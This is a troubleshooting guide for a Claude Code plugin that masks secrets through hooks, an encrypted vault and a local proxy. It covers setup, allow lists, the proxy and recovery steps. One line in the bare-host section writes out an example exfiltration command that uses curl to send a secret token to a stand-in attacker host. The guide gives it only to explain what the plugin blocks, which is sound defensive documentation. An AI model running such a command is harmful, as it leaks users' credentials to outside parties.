# Troubleshooting ZeroH Disclosure

Match the symptom below to its likely cause, then use the smallest fix that preserves local evidence.

## Contents

- [A hook does not fire](#a-hook-does-not-fire)
- [The session banner is missing or has the wrong mode](#the-session-banner-is-missing-or-has-the-wrong-mode)
- [A token appears in command output](#a-token-appears-in-command-output)
- [A real value appears in model-facing output](#a-real-value-appears-in-model-facing-output)
- [A shell token placement is denied](#a-shell-token-placement-is-denied)
- [An image could not be processed](#an-image-could-not-be-processed)
- [Bash or PowerShell is denied by the settings guard](#bash-or-powershell-is-denied-by-the-settings-guard)
- [A receipt command was denied as data exfiltration](#a-receipt-command-was-denied-as-data-exfiltration)
- [A slash command fails with "Shell command permission check failed"](#a-slash-command-fails-with-shell-command-permission-check-failed)
- [pdftotext is missing](#pdftotext-is-missing)
- [A destination stays blocked after editing allow.json](#a-destination-stays-blocked-after-editing-allowjson)
- [A bare host is denied](#a-bare-host-is-denied)
- [A command shows "[ZeroH: the command failed …]"](#a-command-shows-zeroh-the-command-failed-)
- [A background command or Monitor is denied](#a-background-command-or-monitor-is-denied)
- [ZeroH could not open its vault](#zeroh-could-not-open-its-vault)
- [An old token no longer restores](#an-old-token-no-longer-restores)
- [An expired token is denied](#an-expired-token-is-denied)
- [A typed secret is blocked instead of masked](#a-typed-secret-is-blocked-instead-of-masked)
- [The local proxy is unavailable](#the-local-proxy-is-unavailable)
- [A project where ZeroH Disclosure is disabled](#a-project-where-zeroh-disclosure-is-disabled)
- [Remove the login item by hand](#remove-the-login-item-by-hand)
- [Unmask says it needs an interactive session](#unmask-says-it-needs-an-interactive-session)
- [Report miss has no dialog](#report-miss-has-no-dialog)
- [A values file remains on disk](#a-values-file-remains-on-disk)

## A hook does not fire

| Likely cause                                                              | Fix                                                                                                                                                                    |
| ------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Claude Code was already running when the plugin was installed or updated. | Exit every Claude Code session and start a new one. Hooks are loaded at process start.                                                                                 |
| The plugin is not installed from the expected marketplace.                | Run `claude plugin install zeroh-disclosure@zeroh`, then restart.                                                                                                      |
| A checkout path is being tested without installation.                     | Start with `claude --plugin-dir <checkout>/plugins/zeroh-disclosure`.                                                                                                  |
| Node is too old or missing from Claude Code's environment.                | Run `node --version` in the same terminal. The plugin requires Node.js 20 or later.                                                                                    |
| The event does not match `PreToolUse`.                                    | The current matcher covers Bash, PowerShell, Monitor, Read, Edit, MultiEdit, Write, NotebookEdit, WebFetch, Grep, Agent, and `mcp__*`. `PostToolUse` covers all tools. |
| The command was run outside Claude Code.                                  | Hooks only receive Claude Code hook events. Use the CLI directly for standalone policy and verification work.                                                          |

Confirm activation by starting a new session. `SessionStart` should show the ZeroH block banner on
screen. If it does not, test the checkout with `--plugin-dir` to separate installation problems
from hook behaviour.

## The session banner is missing or has the wrong mode

`ZEROH_BANNER` overrides `<ZEROH_HOME>/banner.json`. Check the environment of the terminal that
starts Claude Code, then set the saved mode again if needed:

```bash
zeroh-disclosure banner full   # full view every session
zeroh-disclosure banner compact
zeroh-disclosure banner off
```

With no explicit mode, the full view appears once and `<ZEROH_HOME>/banner-shown` records that it
was shown; later sessions use the five-line banner. `/zeroh-disclosure:status` always shows the
full view and does not change that marker. Warnings still appear in `off` mode.

The banner is plain text with no colour codes; if its art does not line up, your terminal font
lacks the block characters, and `zeroh-disclosure banner compact` shows one line instead.

## A token appears in command output

This is usually expected. `PostToolUse` masks every sensitive value that a local command prints,
so Claude sees `[API_KEY-3f9a1c]` instead of `sk_live_ZEROHFAKE_1234567890abcdef`. A token in tool
output means the output boundary ran.

If the command itself received the literal token instead of the real value, check:

1. The token was copied exactly, including brackets and six lowercase hexadecimal characters.
2. The token came from the same project vault. Vault files are keyed by the absolute project path.
3. `PreToolUse` fired for Bash or PowerShell.
4. The token still exists under `<ZEROH_HOME>/vault/<project-hash>.json` and the matching
   `vault.key` has not been removed.
5. The command was not inside a comment. Tokens in shell comments are deliberately not bound.

Do not replace the token with a real secret in the prompt. Read the source again so ZeroH can
recreate the mapping.

## A real value appears in model-facing output

Stop the session and preserve the local report or transcript for investigation. Do not paste the
value into an issue.

Check whether the content came from:

- an image or scanned PDF, which the free plugin passes unchanged after a notice;
- local Claude Code transcript storage created before `PostToolUse` rewrote the model-facing tool
  result; or
- a tool that did not produce a normal `PostToolUse` event.

If the value was a credential, rotate it. Then reproduce with a fake value (put `ZEROHFAKE` in it)
and report it privately: use the repository's private vulnerability reporting or email
hello@bladelabs.io, with the plugin and Claude Code versions and the steps. Never include the real
value. If ZeroH simply did not recognise the value, use `/zeroh-disclosure:report-miss` so it is
masked from now on.

## A shell token placement is denied

The denial says ZeroH could not safely late-bind a named token and gives the scanner reason. Bash
and PowerShell are denied instead of receiving a real value in `updatedInput`, because Claude Code
can persist that attachment in its transcript.

Use the token as a plain argument, inside double quotes, or assign it to a variable first. Balance
all quotes, substitutions, heredocs, here-strings, and block comments. Replace typographic
PowerShell quotes (`‘ ’ ‚ ‛ “ ” „`) with ASCII quotes. Do not paste the real value into the command.

## An image could not be processed

Symptom:

```text
API Error: an image ... could not be processed
```

The free plugin passes image bytes through; it does not resize, decode, or redact them. This error
therefore means Claude Code or the upstream provider rejected the original image block, not that
ZeroH produced a masked image.

Open the image locally and confirm it is a valid supported image. Re-save it as a normal PNG or
JPEG, remove unusual metadata, and retry. For a test fixture, use a valid image with realistic
dimensions rather than a corrupt or truncated base64 placeholder.

If the failure follows a Claude Code update, the Read response shape may have changed; see
[Re-record Read response shapes](development.md#re-record-read-response-shapes). Keep the exact
provider error, but remove any sensitive image content before sharing it.

## Bash or PowerShell is denied by the settings guard

The denial text is:

```text
ZeroH Disclosure settings can only be changed by the user. Do not edit or read them; ask the user.
```

The command referred to ZeroH's folder (`ZEROH_HOME`), `allow.json`,
`vault.key`, `allow.key`, or a direct `zeroh-disclosure allow` invocation. The same rule applies to
file and MCP tools.

Run the administrative command yourself in a terminal. For receipt and report reads, use the
plugin slash commands:

```text
/zeroh-disclosure:mask-receipt
/zeroh-disclosure:report
```

Do not rename or relocate settings to bypass the guard. Read and Grep access to the project's
receipts under `<ZEROH_HOME>/projects/<project>/sessions/` is already allowed for evidence
inspection.

## A receipt command was denied as data exfiltration

Claude Code's auto-mode classifier may treat a model-initiated read of ZeroH's folder as data
exfiltration. ZeroH's read-only commands avoid that: the status, receipt, show, config,
proxy-status and report commands run their Node script while the slash command is expanded, under
the command's narrow `allowed-tools` rule, and only the finished, value-free output is placed in
the prompt. The model makes no Bash or PowerShell tool call.

If such a command is denied, restart Claude Code so it reloads the plugin's command files. If it is
still denied, note your Claude Code version and report it with fake data only.

## A slash command fails with "Shell command permission check failed"

The status, receipt, show, config, proxy, report and unmask commands run one
`node "${CLAUDE_PLUGIN_ROOT}/…"` line while Claude Code expands the command. Claude Code chooses
the shell for that line, not ZeroH and not your `defaultShell` setting:

- **macOS, Linux and WSL:** always Bash, also when the PowerShell tool is enabled.
- **Windows with Git for Windows installed (the usual setup):** Git Bash.
- **Windows without Git Bash:** the PowerShell tool, which Claude Code then turns on by itself.

Each command allows its exact script in both forms, `Bash(node "…")` and `PowerShell(node "…")`,
so it works in all three cases without a permission prompt. `"defaultShell": "powershell"` in
Claude Code settings changes only the commands you type after `!` yourself; slash commands still
use Git Bash when it is installed, and that is fine.

The check fails when a permission rule denies the shell that Claude Code picked. A deny rule
always wins over a command's `allowed-tools`. The usual cause on Windows is a blanket
`"deny": ["Bash"]` (or `--disallowedTools Bash`) kept to force PowerShell while Git Bash is still
installed: Claude Code keeps sending the command lines to Bash, and every command fails. Fix it
in one of these ways:

- Remove the blanket `Bash` deny rule. Deny specific Bash commands instead, if you need to.
- If you want PowerShell only, uninstall Git for Windows. Claude Code finds Git Bash in its
  standard install folders even when it is not on `PATH`. Without Git Bash, Claude Code runs the
  command lines in PowerShell. Do not set `CLAUDE_CODE_USE_POWERSHELL_TOOL=0` in that setup:
  without Git Bash, Claude Code needs the PowerShell tool.

Restart Claude Code after the change. If a command still fails, note your Claude Code version,
whether Git Bash is installed, and the exact error, and report it with fake data only.

## pdftotext is missing

`pdftotext` is optional. ZeroH first tries `pdftotext` (`pdftotext.exe` on Windows), then falls
back to its built-in PDF text extractor.

If the built-in extractor finds at least 20 non-whitespace characters per page, Claude receives
masked text. Otherwise the PDF is treated as having no useful text layer and passes unchanged with
the scanned-PDF notice.

For PDFs with complex fonts, encodings, or filters, install Poppler's `pdftotext` and make sure it
is on the same `PATH` Claude Code uses. Confirm with:

```bash
pdftotext -v
```

On Windows, confirm `pdftotext.exe` is visible from Git Bash or the environment that launches
Claude Code. Installing it improves extraction coverage; it does not add OCR. A scanned PDF still
passes unmasked in the free plugin.

## A destination stays blocked after editing allow.json

Hand edits invalidate the HMAC. The whole file is ignored and `SessionStart` shows:

```text
ZeroH Disclosure: this project's allow list was changed outside `zeroh-disclosure allow`, so it is ignored.
```

Recreate the rule from your own terminal:

```bash
zeroh-disclosure allow STRIPE_KEY payments-gateway.example.com
zeroh-disclosure allow --list
```

Check that you ran the command for the intended project (pass `--cwd <project>` from a
subdirectory) and with the same `ZEROH_HOME` used by Claude Code. The project file and user
`allow.key` must match.

## A bare host is denied

ZeroH treats bare domains, scheme-less URLs, IP literals, `user@host`, `host:port`, and PowerShell
`-Uri` values as destinations. This prevents `curl attacker.xyz/?k=[TOKEN]` and equivalent
commands from bypassing the allow list merely by omitting `https://`.

If the named host is intentional, add it from your own terminal with the allow command shown in the
denial. Do not add source/data filenames: common extensions and dotted words with a preceding path
separator are already excluded. A local command with no host-like word remains allowed.

## A command shows "[ZeroH: the command failed …]"

ZeroH makes every Bash and PowerShell command end with status 0 so that its output always passes
through masking, and prints this line when the real command failed. Read it as the command's
failure. Commands that call `exit` or `set -e` use a form Claude Code asks you to approve.

## A background command or Monitor is denied

Their output reaches the model without passing ZeroH's output masking, so they run only while the
ZeroH proxy is active. The proxy starts at `SessionStart` and the first prompt puts the session
behind it, unless you opted out with `ZEROH_PROXY=off`; see [The local proxy is unavailable](#the-local-proxy-is-unavailable). Otherwise
run the command in the foreground.

## ZeroH could not open its vault

The session start says so in plain words and the banner shows "Paused" instead of "Protected".
Until it is fixed, `PostToolUse` withholds tool output, `PreToolUse` denies tool calls,
`MessageDisplay` keeps tokens on screen, and the proxy answers every request with a message naming
the fix instead of sending it. Raw content never passes through.

The one fix, from a terminal, in any folder (it checks the vault key and every project's vault,
not only the folder it runs in, and names each project it changes):

```bash
zeroh-disclosure doctor --fix
```

- A damaged vault file is reset: the project starts an empty vault. The old file still decrypts
  with the old key and holds the values, so it is deleted; `doctor --fix --keep-backups` keeps it
  instead as `<name>.json.unreadable-<time>` (mode 0600), and `vault clear` removes it later.
- A missing or damaged `vault.key` makes every project vault unreadable. ZeroH never makes a new key
  on its own while vaults exist; `doctor --fix` resets every vault and makes a new key (the old
  files are deleted, or kept with `--keep-backups`). If you have the old key in a backup, put it
  back as `<ZEROH_HOME>/vault.key` first instead.
- A vault file that cannot be read at all (a permission, or another program such as an antivirus
  scanner holding it) is not damaged: `doctor` names it and `--fix` leaves it alone. Fix the
  permission or wait, and try again.
- A vault written by a newer ZeroH Disclosure is never read or overwritten by an older one: update
  the plugin.

Tokens from earlier sessions stay tokens after a reset; share the values again if a task needs
them.

## An old token no longer restores

Run `zeroh-disclosure vault status` from the same project and with the same `ZEROH_HOME` used by
Claude Code. The command reports only aggregate counts and age; it never prints values.

A detected mapping may have expired under `ZEROH_VAULT_RETENTION` (`7d` by default, or `30d`), or
may have been removed at the end of a `session` retention run. Expiry runs only at `SessionStart`
and `SessionEnd`, with the policy the last `SessionStart` stored; `vault status` shows it and
whether it came from the vault or the current configuration. `zeroh-disclosure vault clear` also
removes every project mapping immediately. Old transcripts deliberately retain their tokens and
remain safe, but an expired token has no value to restore. Read or produce the original source
again so ZeroH can mask it and recreate the mapping. A value still present in `.env` or a supported
credential file is re-read on the next `SessionStart` and does not expire by age.

## An expired token is denied

`PreToolUse` reports that a token `expired and ZeroH no longer holds the value`. The call used a
token whose mapping was removed by retention or `vault clear`, for example after `claude --resume`
of a session that ended under `session` retention. ZeroH denies the call rather than run it with
the literal token, which would fail or write the token into a file.

Share the value again (or have the model re-read its source) so ZeroH masks it under a new token,
then retry. Expired tokens are never reassigned to another value. ZeroH remembers only the token,
its type and when it expired, for 90 days; after that the token is treated like any unknown token
and passes through unchanged. If you resume sessions often, use `ZEROH_VAULT_RETENTION=7d` or `30d`.

## A typed secret is blocked instead of masked

This means the current session is not using the default local proxy. It is expected when
`ZEROH_PROXY=off` is set for this session, after `proxy off`, on Bedrock, Vertex or Foundry, whose
traffic does not pass the proxy, and when your shell or a higher-precedence settings file sets
`ANTHROPIC_BASE_URL` (Claude Code then ignores ZeroH's entry). In a first session, the first prompt
puts the session behind the proxy by itself; if Claude Code does not pick up the changed settings
file, ZeroH says so once and a restart fixes it.

`UserPromptSubmit` cannot replace the prompt, so it blocks the submission with a short message
(what it found, by kind or provider, and why it could not be masked; never the prompt or a value)
and copies a masked rewrite to the clipboard when a supported clipboard command is available, or
shows it for you to paste. Paste that rewrite, or
close the session, remove the opt-out, and start Claude Code again.

## The local proxy is unavailable

```bash
zeroh-disclosure doctor         # the proxy's state and what looks wrong
zeroh-disclosure doctor --fix   # reset: removes ZeroH's settings entry, stops every ZeroH proxy it finds
zeroh-disclosure proxy off      # or remove the proxy altogether
```

The rule is: never block Claude Code, never send unmasked. What the proxy answers when it cannot
forward a request depends on whether retrying can help:

- **`502`, retried by Claude Code**: the network failed on the way to the model API (no
  connection within 10 seconds, DNS, Wi-Fi or VPN changes, a reset), as it would without ZeroH.
  When the network proxy ZeroH recorded (`HTTPS_PROXY` from an office or VPN session) cannot be
  reached, the proxy drops it and Claude Code's retry goes direct; the next session that names a
  network proxy records it again.
- **`400` with `x-should-retry: false`** and a message naming the fix: anything retrying cannot
  fix, such as an untrusted certificate (set `NODE_EXTRA_CA_CERTS`), a network proxy that refuses
  or asks for a password, an upstream that points back at the proxy, or a vault that cannot be
  opened. When the proxy is not running at all, the next
  prompt tries to restart it for up to three seconds; if this session's URL still does not answer,
  ZeroH stops the prompt and says once: "ZeroH's local proxy isn't running, so what you type can't be
  masked in this session. Restart Claude Code to continue without it; until then typed secrets are
  stopped, not sent." Later prompts in the same session get a short reminder. The next session
  reaches the proxy on a new port if another program took the old one, or connects directly (ZeroH
  takes its entry out) when the proxy cannot run. Each fallback writes a local report
  (`<ZEROH_HOME>/reports/proxy-<time>.json`, never sent); `zeroh-disclosure doctor --report` prints a
  paste-safe summary and `zeroh-disclosure reports list` shows it with kind `proxy`.

`doctor --fix` is the one recovery for everything else: it takes ZeroH's entry out of your Claude
Code settings (putting back the `ANTHROPIC_BASE_URL` you had before), stops this home's proxy and
any other ZeroH proxy it finds on a port ZeroH recorded or your settings name (for example one left
running after `~/.zeroh` was deleted by an older build), and removes the proxy's files and login
item. The next Claude Code session sets the proxy up again. When another Claude settings file
(another profile, `CLAUDE_CONFIG_DIR`) still uses this proxy, `doctor --fix` only takes this
settings file's entry out and leaves the proxy and its login item running for the other one.

A session that was running when the proxy stopped (a shutdown, `systemctl --user stop`, a killed
process) keeps its entry: taking it out would send the rest of that session's turn straight to the
model API. Its next prompt starts the proxy again.

### "ZeroH proxy upstream loops back to itself" after an upgrade

Builds before 1.0 wrote `http://127.0.0.1:<port>` without `/z/<key>` into your settings. Press
Esc, quit Claude Code, run `zeroh-disclosure doctor --fix` from the updated plugin (`node
<plugin>/bin/zeroh-disclosure.mjs doctor --fix`), and start Claude Code again. Without the command,
delete the `ANTHROPIC_BASE_URL` line that points at `http://127.0.0.1:…` from
`~/.claude/settings.json` and remove the `proxy` folder in ZeroH's folder (`~/.zeroh/proxy`, or
`%LOCALAPPDATA%\ZeroH\proxy` on Windows).

### A project where ZeroH Disclosure is disabled

Your Claude Code settings point every session at the proxy, including sessions in a project where
you disabled the plugin. No ZeroH hook runs there, so the proxy cannot tie those requests to a
ZeroH session:

- while a ZeroH Disclosure session is running anywhere with the same settings file, they are
  masked too (the proxy cannot tell them from a ZeroH session's own requests), with that session's
  project vault;
- when none is running, they pass through unmasked, as if the proxy were not there, and are never
  refused.

To stop using the proxy everywhere, run `zeroh-disclosure proxy off`.

The per-user login item normally starts the copied runtime at login, and `SessionStart` restarts a
killed proxy before model traffic begins. If startup fails while the setting still points to the
dead ZeroH URL, `SessionStart` removes only that entry, restores any prior gateway URL, preserves
other settings edits, and leaves typed-prompt blocking in place. A connection URL you changed
yourself is left untouched. Re-enable the default proxy by removing `ZEROH_PROXY=off`, and after
`proxy off` also run `zeroh-disclosure proxy on`: the next session starts the proxy and registers
its login item, and its first prompt writes the settings entry.

## Remove the login item by hand

Prefer `zeroh-disclosure proxy off`, which restores the Claude setting, stops the proxy, and removes
the login item together. If the CLI is unavailable, close Claude Code and remove only the matching
per-user item:

- Linux systemd: `systemctl --user disable --now zeroh-disclosure-proxy.service`, then remove
  `${XDG_CONFIG_HOME:-~/.config}/systemd/user/zeroh-disclosure-proxy.service` and run
  `systemctl --user daemon-reload`.
- Linux XDG fallback: remove
  `${XDG_CONFIG_HOME:-~/.config}/autostart/zeroh-disclosure-proxy.desktop`.
- macOS: run
  `launchctl bootout gui/$UID ~/Library/LaunchAgents/com.bladelabs.zeroh-disclosure-proxy.plist`,
  then remove that plist.
- Windows: run `schtasks /Delete /TN "ZeroH Disclosure Proxy" /F` and remove
  `<ZEROH_HOME>\proxy\zeroh-disclosure-proxy.xml` if it remains.

The item runs `<ZEROH_HOME>/bin/zeroh-disclosure-proxy/bin/proxy-daemon.mjs` without administrator
rights. Removing the login item alone does not repair Claude settings; if they still contain a
ZeroH loopback `ANTHROPIC_BASE_URL`, remove only that key or restore your previous gateway URL.

## Unmask says it needs an interactive session

`request_unmask` requires an interactive Claude Code entrypoint and the MCP elicitation capability
because only the user may select the duration. Headless `claude -p`, older Claude Code clients,
and clients that do not advertise elicitation receive this refusal immediately. No dialog is
attempted and no grant is written.

Start an interactive Claude Code session with a current client, then ask Claude to call
`request_unmask` again. If an interactive session still refuses, restart after enabling or
updating the plugin and inspect `/mcp` for the `zeroh-disclosure` server. Do not add an
`Elicitation` auto-answer hook: the settings guard denies model attempts to create one because it
would bypass direct user consent.

## Report miss has no dialog

`/zeroh-disclosure:report-miss` needs interactive MCP elicitation so the value can be typed into a
private form instead of chat. In headless mode an empty call is refused immediately. If Claude
already supplied `{value, type_guess, where, why}`, ZeroH still masks the value and saves the
shape-only report locally, then returns without waiting for a dialog.

Sending reports to Blade Labs comes in 1.1, so 1.0 offers only `Keep it on this computer` and
`Delete it`.
There is no network sender. Use `zeroh-disclosure reports list` and `reports show <id>` to inspect local shape data, or
`reports delete <id>` to discard it. Deleting the report does not remove the encrypted vault
mapping, so later occurrences remain masked. If the tool says the session reached 20 reports,
start a new session. Rotate any credential that may already have reached a model.

## A values file remains on disk

Bash and PowerShell commands remove the values file immediately after importing it (a read-only
run directory leaves it for the next step). `PostToolUse`
deletes it again. `SessionStart` and `Stop` remove run files older than ten minutes.

An abrupt process or machine stop can leave a recent file under:

```text
<ZEROH_HOME>/run/<session-id>/
```

Start and end a new Claude Code turn to run cleanup. If you must remove the file manually, close
Claude Code first, confirm the exact session directory, and delete only that stale run file. Do not
remove `vault.key` or the encrypted vault unless you intend to lose token restoration.
